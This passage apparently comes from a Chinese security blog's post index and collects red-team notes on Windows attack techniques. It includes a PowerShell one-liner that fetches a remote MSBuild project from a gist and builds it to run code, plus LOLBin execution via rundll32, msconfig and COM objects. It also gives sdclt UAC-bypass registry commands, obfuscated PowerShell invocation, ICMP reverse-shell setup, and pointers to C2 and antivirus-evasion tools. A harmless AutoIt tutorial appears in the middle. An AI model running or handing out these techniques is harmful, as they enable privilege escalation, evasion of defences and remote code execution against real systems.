class="selector-attr">[Reflection.Assembly]</span>::<span class="built_in">LoadWithPartialName</span>(<span class="string">&#x27;Microsoft.Build&#x27;</span>);</span><br><span class="line"><span class="variable">$proj</span> = <span class="selector-attr">[System.Xml.XmlReader]</span>::<span class="built_in">create</span>(<span class="string">&quot;https://gist.githubusercontent.com/bohops/a29a69cf127ffb0e37622d25b9f79157/raw/35fa4c5a0d2db037220f224b5c4c269ea243b3bd/test.csproj&quot;</span>);</span><br><span class="line"><span class="variable">$e</span>=new-<span class="selector-tag">object</span> Microsoft<span class="selector-class">.Build</span><span class="selector-class">.Evaluation</span><span class="selector-class">.Project</span>(<span class="variable">$proj</span>);</span><br><span class="line"><span class="variable">$e</span><span class="selector-class">.Build</span>();</span><br><span class="line">or</span><br><span class="line">Add-Type -Path <span class="string">&quot;C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.dll&quot;</span></span><br><span class="line"><span class="variable">$proj</span> = <span class="selector-attr">[System.Xml.XmlReader]</span>::<span class="built_in">create</span>(<span class="string">&quot;https://gist.githubusercontent.com/bohops/a29a69cf127ffb0e37622d25b9f79157/raw/35fa4c5a0d2db037220f224b5c4c269ea243b3bd/test.csproj&quot;</span>);</span><br><span class="line"><span class="variable">$e</span>=new-<span class="selector-tag">object</span> Microsoft<span class="selector-class">.Build</span><span class="selector-class">.Evaluation</span><span class="selector-class">.Project</span>(<span class="variable">$proj</span>);</span><br><span class="line"><span class="variable">$e</span><span class="selector-class">.Build</span>();</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;Project ToolsVersion=<span class="string">&quot;4.0&quot;</span> xmlns=<span class="string">&quot;http://schemas.microsoft.com/developer/msbuild/2003&quot;</span>&gt;</span><br><span class="line">  &lt;Target Name=<span class="string">&quot;Hello&quot;</span>&gt;</span><br><span class="line">   &lt;FragmentExample /&gt;</span><br><span class="line">   &lt;ClassExample /&gt;</span><br><span class="line">  &lt;/Target&gt;</span><br><span class="line">  &lt;UsingTask</span><br><span class="line">    TaskName=<span class="string">&quot;FragmentExample&quot;</span></span><br><span class="line">    TaskFactory=<span class="string">&quot;CodeTaskFactory&quot;</span></span><br><span class="line"> AssemblyFile=<span class="string">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot;</span> &gt;</span><br><span class="line">    &lt;ParameterGroup/&gt;</span><br><span class="line">    &lt;Task&gt;</span><br><span class="line">      &lt;Using Namespace=<span class="string">&quot;System&quot;</span> /&gt;  </span><br><span class="line">      &lt;Code Type=<span class="string">&quot;Fragment&quot;</span> Language=<span class="string">&quot;cs&quot;</span>&gt;</span><br><span class="line">        &lt;!<span class="selector-attr">[CDATA[        ]</span>]&gt;</span><br><span class="line">      &lt;/Code&gt;</span><br><span class="line">    &lt;/Task&gt;</span><br><span class="line">&lt;/UsingTask&gt;</span><br><span class="line">&lt;UsingTask</span><br><span class="line">    TaskName=<span class="string">&quot;ClassExample&quot;</span></span><br><span class="line">    TaskFactory=<span class="string">&quot;CodeTaskFactory&quot;</span></span><br><span class="line">    AssemblyFile=<span class="string">&quot;C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll&quot;</span> &gt;</span><br><span class="line">&lt;Task&gt;</span><br><span class="line">&lt;!-- &lt;Reference Include=<span class="string">&quot;System.IO&quot;</span> /&gt; Example Include --&gt;</span><br><span class="line">      &lt;Code Type=<span class="string">&quot;Class&quot;</span> Language=<span class="string">&quot;cs&quot;</span>&gt;</span><br><span class="line">        &lt;!<span class="selector-attr">[CDATA[using System;using System.Diagnostics;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;public class ClassExample :  Task, ITask&#123;public override bool Execute()&#123;                    System.Diagnostics.Process proc = new System.Diagnostics.Process();                    proc.StartInfo.FileName = <span class="string">&quot;c:\\windows\\system32\\notepad.exe&quot;</span>;                    proc.Start();return true;&#125;&#125;        ]</span>]&gt;</span><br><span class="line">      &lt;/Code&gt;</span><br><span class="line">    &lt;/Task&gt;</span><br><span class="line">  &lt;/UsingTask&gt;</span><br><span class="line">&lt;/Project&gt;</span><br></pre></td></tr></table></figure><p><a href="https://twitter.com/bohops/status/971026915736899585">https://twitter.com/bohops/status/971026915736899585</a><br><a href="https://gist.github.com/bohops/a29a69cf127ffb0e37622d25b9f79157">https://gist.github.com/bohops/a29a69cf127ffb0e37622d25b9f79157</a></p><h2 id="5-bypassUAC-inf"><a href="#5-bypassUAC-inf" class="headerlink" title="5.bypassUAC- inf"></a>5.bypassUAC- inf</h2><p><a href="https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec">https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/73C5C696FC0B1C87E9B1DF9924048DFF.jpg" alt="enter description here"></p><h2 id="6-rundll32-exe"><a href="#6-rundll32-exe" class="headerlink" title="6.rundll32.exe"></a>6.rundll32.exe</h2><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/83309E1B1069CA79F74AABCCD5AEAA3D.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6C99AF94C094ECF589F84CBE22769C61.jpg" alt="enter description here"></p><h2 id="7-ATPSJScript"><a href="#7-ATPSJScript" class="headerlink" title="7.ATPSJScript"></a>7.ATPSJScript</h2><p><a href="https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec">https://gist.github.com/homjxi0e/0d683007bd4a3ce39d3e19342aaa68ec</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1521117181892.jpg" alt="enter description here"></p><h2 id="8-Reflection-Assembly"><a href="#8-Reflection-Assembly" class="headerlink" title="8.Reflection.Assembly"></a>8.Reflection.Assembly</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\demon&gt;    <span class="variable">$RAS</span> = Join-Path -Path c:\windows\system32\ -ChildPath </span><br><span class="line">calc<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Users\demon&gt;   <span class="selector-attr">[Reflection.Assembly]</span>::LoadWithPartialName</span><br><span class="line">(<span class="string">&#x27;Microsoft.VisualBasic&#x27;</span>);<span class="selector-attr">[Microsoft.VisualBasic.Interaction]</span>::<span class="built_in">Shell</span>(<span class="string">&quot;$RAS&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/6400B060F225D9AEAFBB66F93CCEA2FF.jpg" alt="enter description here"></p><h2 id="9-rundll32"><a href="#9-rundll32" class="headerlink" title="9.rundll32"></a>9.rundll32</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> C:\Windows\System32\pcwutl<span class="selector-class">.dll</span>,LaunchApplication calc.exe</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32<span class="selector-class">.exe</span> shell32<span class="selector-class">.dll</span>,ShellExec_RunDLL  C:\Windows\System32\cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/30BD1EBA-BB5C-4FDE-AEFB-7F6629A7A70E.png" alt="enter description here"></p><h2 id="10-sigverif-exe"><a href="#10-sigverif-exe" class="headerlink" title="10.sigverif.exe"></a>10.sigverif.exe</h2><p><a href="http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/">http://www.hexacorn.com/blog/2018/04/27/i-shot-the-sigverif-exe-the-gui-based-lolbin/</a></p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div><script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script><script>    var ivaInstance = new Iva('ivaLive', {        appkey: 'By9WGzBIx', //应用标示        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/sigverif.mp4', //视频        title: 'test', //视频标题，后台视频管理中的标题        cover: '' //视频封面，只有在autoplay:false才可生效    });</script><script src="//cytroncdn.videojj.com/latest/Iva.js"></script><h2 id="11-msconfig"><a href="#11-msconfig" class="headerlink" title="11.msconfig"></a>11.msconfig</h2><figure class="highlight vbscript-html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml  version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">MSCONFIGTOOLS</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">NAME</span>=<span class="string">&quot;LOLBin&quot;</span> <span class="attr">PATH</span>=<span class="string">&quot;%windir%\system32\WindowsPowerShell\v1.0\powershell.exe&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">DEFAULT_OPT</span>=<span class="string">&quot;-command calc.exe &quot;</span> </span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">HELP</span>=<span class="string">&quot;LOLBin MSCONFIGTOOLS&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">MSCONFIGTOOLS</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/4EF4BB29-4BDF-4265-A9A5-FF62C278A234.png" alt="enter description here"></p><ol><li>讲上述代码 写为mscfgtlc.xml  放置路径为C:\Windows\System32</li></ol><p>2.启动CMD ：msconfig -5</p><ol start="3"><li>找到LOLBin一栏 点击启动 触发条件<br><a href="https://twitter.com/pabraeken/status/991314564896690177">https://twitter.com/pabraeken/status/991314564896690177</a></li></ol><h2 id="12-DXCap-exe"><a href="#12-DXCap-exe" class="headerlink" title="12.DXCap.exe"></a>12.DXCap.exe</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DXCap<span class="selector-class">.exe</span> -c C:\Windows\System32\notepad.exe</span><br></pre></td></tr></table></figure><p><a href="https://twitter.com/harr0ey/status/992008180904419328">https://twitter.com/harr0ey/status/992008180904419328</a></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/493ABA67CD0EE259E6ACE72AF3F18BB0.png" alt="enter description here"></p><h2 id="13-Register-cimprovider-exe"><a href="#13-Register-cimprovider-exe" class="headerlink" title="13.Register-cimprovider.exe"></a>13.Register-cimprovider.exe</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Register-cimprovider -path &quot;C:<span class="keyword">\folder</span><span class="keyword">\evil</span>.dll&quot;   </span><br></pre></td></tr></table></figure><p><a href="https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-cimprovider.md">https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Register-cimprovider.md</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/A68A0BB2F11D180A4A7D2361BB1BD4CF.jpg" alt="enter description here"></p><h2 id="14-COMHijacking18-reg"><a href="#14-COMHijacking18-reg" class="headerlink" title="14.COMHijacking18.reg"></a>14.COMHijacking18.reg</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$COMobj</span> = <span class="selector-attr">[activator]</span>::<span class="built_in">CreateInstance</span>(<span class="selector-attr">[type]</span>::<span class="built_in">GetTypeFromCLSID</span>(<span class="string">&quot;&#123;00020000-0000-0000-C000-000000000046&#125;&quot;</span>));<span class="variable">$COMobj</span><span class="selector-class">.Exec</span>();</span><br></pre></td></tr></table></figure><p><a href="https://gist.github.com/homjxi0e/40f30c3be62c6ef152d6f6fffa9dba3c">https://gist.github.com/homjxi0e/40f30c3be62c6ef152d6f6fffa9dba3c</a><br><a href="https://twitter.com/harr0ey/status/993778424853549056">https://twitter.com/harr0ey/status/993778424853549056</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8B3C3B183E825865750E06B5F4A83BD9.png" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-20250</title>
      <link href="/CVE-2018-20250.html"/>
      <url>/CVE-2018-20250.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/CVE-2018-20250.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a><br><a href="https://github.com/manulqwerty/Evil-WinRAR-Gen">https://github.com/manulqwerty/Evil-WinRAR-Gen</a><br><a href="https://github.com/360-A-Team/CVE-2018-20250/blob/master/ace.bt">https://github.com/360-A-Team/CVE-2018-20250/blob/master/ace.bt</a></p>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AutoIt笔录1 hello word</title>
      <link href="/AutoIt1.html"/>
      <url>/AutoIt1.html</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=3&id=907651435&auto=0&height=66"></iframe><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>我尝试着实用小众化语言，并尝试着使用这几天我学习到的东西，做成自己的笔录来激发你们的兴趣爱好。更好的去合理化使用它。当然想做点其他有意思的事情，到时候另说。</p><p>  AutoIt 目前最新是v3版本，这是一个使用类似BASIC脚本语言的免费软件,它设计用于Windows GUI(图形用户界面)中进行自动化操作。它利用模拟键盘按键，鼠标移动和窗口&#x2F;控件的组合来实现自动化任务。而这是其它语言不可能做到或无可靠方法实现的(例如VBScript和SendKeys).</p><h2 id="2-hello-word"><a href="#2-hello-word" class="headerlink" title="2.hello word"></a>2.hello word</h2><p>万物都逃不过 hello word 的真香定律</p><ol><li>首先我们需要学习的是第一个函数是msgbox<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MsgBox</span> ( 标志, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;文本&quot;</span> [, 超时时间] )</span><br><span class="line"><span class="built_in">MsgBox</span> ( flag, <span class="string">&quot;title&quot;</span>, <span class="string">&quot;text&quot;</span> [, timeout = <span class="number">0</span> [, hwnd]] )</span><br></pre></td></tr></table></figure></li><li>我们右键新建一个au3，并右键选择编辑它<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550713802195.jpg" alt="enter description here"></li></ol><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550713873518.jpg" alt="enter description here"></p><ol start="3"><li>打上我们的第一个函数msgbox,这时候我们可以使用在函数上按下F1(查看使用的帮助参数)<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550713915110.jpg" alt="enter description here"></li></ol><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550713985070.jpg" alt="enter description here"></p><ol start="4"><li>我们首先可以使用很简单的例子，使用0  这个标志,然后后面跟上我们的标题和文字就行了。<br>函数的表达式</li></ol><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">MsgBox</span> ( 标志, <span class="string">&quot;标题&quot;</span>, <span class="string">&quot;文本&quot;</span> [, 超时时间] )</span><br></pre></td></tr></table></figure><p>具体可以参考这份中文文档的函数参数<br><a href="http://www.autoitx.com/Doc/">http://www.autoitx.com/Doc/</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550714205504.jpg" alt="enter description here"></p><p>5.我们写上相关的代码 并保存按下F5 运行就可以了，或者按下F7 编译成exe。<br>我们可以看到他的单引号 和双引号实际上是不区分的，都可以使用它</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">MsgBox</span><span class="params">(<span class="number">0</span>,<span class="string">&#x27;Demon&#x27;</span>,<span class="string">&quot;www.ggsec.cn&quot;</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550714349890.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550714509481.jpg" alt="enter description here"></p><p> 6.我们 换个标志换上3 看看是什么效果。<br> <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550714589289.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1550714633126.jpg" alt="enter description here"></p><p>感觉是不是非常有意思呢！</p>]]></content>
      
      
      
        <tags>
            
            <tag> AutoIt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssfcmd</title>
      <link href="/ssfcmd.html"/>
      <url>/ssfcmd.html</url>
      
        <content type="html"><![CDATA[<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/ssfcmd.mp4'    frameborder="0"     allowfullscreen></iframe><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1548920452447.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1548920452447.png" alt="enter description here"></p><p><a href="https://github.com/paranoidninja/Botnet-blogpost/">https://github.com/paranoidninja/Botnet-blogpost/</a><br><a href="http://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-1/">http://niiconsulting.com/checkmate/2018/02/malware-development-welcome-dark-side-part-1/</a><br><a href="http://niiconsulting.com/checkmate/2018/03/malware-development-welcome-to-the-dark-side-part-4/">http://niiconsulting.com/checkmate/2018/03/malware-development-welcome-to-the-dark-side-part-4/</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sdclt_bypassuac</title>
      <link href="/sdclt-bypassuac.html"/>
      <url>/sdclt-bypassuac.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/10BD30CAFCBA0B875B8BE96270F8D9FF.jpg" alt="enter description here"></p><span id="more"></span><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/05D985E4E5A59CB8958F23AFCC0AF815.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/07B66516-E2C6-415A-910A-5E9800575FB1.png" alt="enter description here"></p><p><a href="http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass">http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass</a></p><p>写入注册表</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\Folder\shell\open\command&quot;</span> /d <span class="string">&quot;cmd.exe /c notepad.exe&quot;</span> /f &amp;&amp; reg add HKCU\Software\Classes\Folder\shell\open\command /v <span class="string">&quot;DelegateExecute&quot;</span> /f</span><br></pre></td></tr></table></figure><p>触发</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%windir%\system32\sdclt.exe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SILENTTRINITY</title>
      <link href="/SILENTTRINITY.html"/>
      <url>/SILENTTRINITY.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8E1782FA5453AD7692E4770E4FDB4154.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/SILENTTRINITY.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/byt3bl33d3r/SILENTTRINITY">https://github.com/byt3bl33d3r/SILENTTRINITY</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PoshC2</title>
      <link href="/PoshC2.html"/>
      <url>/PoshC2.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190117_155025.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/PoshC2.mp4'    frameborder="0"     allowfullscreen></iframe><p><a href="https://github.com/nettitude/PoshC2">https://github.com/nettitude/PoshC2</a><br>需自行安装java JDK 以及.net 3.0并重启<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/F3A058B4-F8D9-4F63-A671-89D7DAD04F80.png" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/24AC54991C6C1B3C2395C2C91E4F09F3.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
          <category> C2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Calc</title>
      <link href="/calc.html"/>
      <url>/calc.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20190108_135030.jpg" alt="enter description here"></p><span id="more"></span><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;powershell C:\??*?\*<span class="number">3</span>?\c?lc.?x? calc</span><br><span class="line">C:\&gt;powershell C:\*\*<span class="number">2</span>\n??e*d.* notepad</span><br><span class="line">C:\&gt;powershell C:\*\*<span class="number">2</span>\t?s*r.* taskmgr</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1546926283868.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/3A6F8188505CC4F70FD853497A78F883.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">doskey /exename=cmd<span class="selector-class">.exe</span> dir=calc<span class="selector-class">.exe</span> </span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1546927004106.jpg" alt="enter description here"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;start-process calc&quot;</span></span><br><span class="line">Invoke-Expression <span class="variable">$cmd</span></span><br><span class="line"><span class="variable">$cmd</span> | iex</span><br><span class="line">iex <span class="variable">$cmd</span></span><br><span class="line">.<span class="string">&#x27;iex&#x27;</span> <span class="variable">$cmd</span></span><br><span class="line"><span class="variable">$t</span> = <span class="selector-attr">[scriptblock]</span>::<span class="built_in">Create</span>(<span class="variable">$cmd</span>)</span><br><span class="line"><span class="variable">$t</span><span class="selector-class">.Invoke</span>()</span><br><span class="line"><span class="variable">$t</span><span class="selector-class">.InvokeReturnAsIs</span>(@())</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1546927137211.jpg" alt="enter description here"></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>icmppsh</title>
      <link href="/icmpsh.html"/>
      <url>/icmpsh.html</url>
      
        <content type="html"><![CDATA[<p>有时，网络管理员会使渗透测试人员的生活更加艰难。令人惊讶的是，他们中的一些确实使用防火墙来实现它们的意图！仅允许流量到已知的机器，端口和服务（入口过滤）以及设置强出口访问控制列表就是这些情况之一。在这种情况下，当您拥有内部网络或DMZ的机器部分时（例如，在Citrix分支机构或类似事件中），通过TCP获取反向shell并不总是微不足道，而不是考虑绑定shell。</p><p>![enter description here][2]</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net<span class="selector-class">.ipv4</span>.icmp_echo_ignore_all=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a><br><a href="https://www.blackhillsinfosec.com/how-to-c2-over-icmp/">https://www.blackhillsinfosec.com/how-to-c2-over-icmp/</a><br><a href="https://github.com/inquisb/icmpsh">https://github.com/inquisb/icmpsh</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh_m<span class="selector-class">.py</span> 本机ip 目标ip</span><br></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-PowerShellIcmp -IPAddress <span class="number">192.168</span>.<span class="number">10.215</span></span><br></pre></td></tr></table></figure><p><a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/DFA76552F9AFB66D8FEA2EFD5430A913.jpg">https://demonsec666.oss-cn-qingdao.aliyuncs.com/DFA76552F9AFB66D8FEA2EFD5430A913.jpg</a></p>]]></content>
      
      
      <categories>
          
          <category> ATT&amp;CK </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> ATT&amp;CK </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Phantom-Evasion</title>
      <link href="/Phantom-Evasion.html"/>
      <url>/Phantom-Evasion.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20181122_104359.jpg" alt="enter description here"></p><span id="more"></span><h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><iframe     width="800"     height="450"     src='https://demonsec666.oss-cn-qingdao.aliyuncs.com/Phantom-Evasion.mp4'    frameborder="0"     allowfullscreen></iframe><p>参考链接:<br><a href="https://github.com/oddcod3/Phantom-Evasion">https://github.com/oddcod3/Phantom-Evasion</a></p><p>Phantom-Evasion是一个用python编写的交互式防病毒逃避工具，即使使用最常见的32位msfvenom有效负载（64位有效负载的较低检测率），也能生成（几乎）FUD可执行文件。该工具的目的是通过使用专注于多态代码和防病毒沙箱检测技术的模块，使得防病毒逃避成为测试者的一项简单任务。从版本1.0开始，Phantom-Evasion还包括一个专门用于持久性和辅助模块的后开发部分。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1542855365231.jpg" alt="enter description here"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/8EEEA27978DBC9996DD7D5EC9ED566C9.jpg" alt="enter description here"><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/E1E96DAEF3270712127F12F145F5340B.jpg" alt="enter description here"><br><img 